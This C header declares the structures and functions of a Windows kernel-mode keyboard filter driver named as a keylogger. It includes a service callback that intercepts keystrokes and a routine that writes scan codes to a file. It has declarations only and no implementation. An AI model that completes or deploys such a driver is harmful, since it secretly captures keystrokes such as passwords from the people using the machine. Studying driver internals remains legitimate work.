#include <ntddk.h>
#include <wdf.h>
#include <wdmsec.h> // for SDDLs
#define NTSTRSAFE_LIB
#include <ntstrsafe.h>

#include <kbdmou.h>

#ifndef KEYLOGGER_FILTER_H
#define KEYLOGGER_FILTER_H


#define DRIVERNAME "Generic.sys: "

//
// Change the following define to 1 if you want to forward
// the request with a completion routine.
//
#define FORWARD_REQUEST_WITH_COMPLETION 0


typedef struct _FILTER_EXTENSION
{
    WDFDEVICE WdfDevice;
    // More context data here

    //
    // The real connect data that this driver reports to
    //
    CONNECT_DATA UpperConnectData;
    FAST_MUTEX FastMutex;

}FILTER_EXTENSION, * PFILTER_EXTENSION;

typedef struct _WORKER_DATA { 
	PIO_WORKITEM Item;  
    USHORT ScanCode;
    PFAST_MUTEX FastMutex;
} WORKER_DATA, * PWORKER_DATA;

WDF_DECLARE_CONTEXT_TYPE_WITH_NAME(FILTER_EXTENSION, FilterGetData)

DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_DEVICE_ADD FilterEvtDeviceAdd;
EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL FilterEvtIoInternalDeviceControl;

IO_WORKITEM_ROUTINE IoWorkitemRoutine;

VOID
FilterServiceCallback(
    IN PDEVICE_OBJECT DeviceObject,
    IN PKEYBOARD_INPUT_DATA InputDataStart,
    IN PKEYBOARD_INPUT_DATA InputDataEnd,
    IN OUT PULONG InputDataConsumed
);

VOID
FilterForwardRequest(
    IN WDFREQUEST Request,
    IN WDFIOTARGET Target
);

VOID 
WriteMakeCodeToFile(
    IN PDEVICE_OBJECT DeviceObject,
    IN PWORKER_DATA Context
);

#if FORWARD_REQUEST_WITH_COMPLETION

VOID
FilterForwardRequestWithCompletionRoutine(
    IN WDFREQUEST Request,
    IN WDFIOTARGET Target
);

VOID
FilterRequestCompletionRoutine(
    IN WDFREQUEST                  Request,
    IN WDFIOTARGET                 Target,
    PWDF_REQUEST_COMPLETION_PARAMS CompletionParams,
    IN WDFCONTEXT                  Context
);

#endif //FORWARD_REQUEST_WITH_COMPLETION

#endif

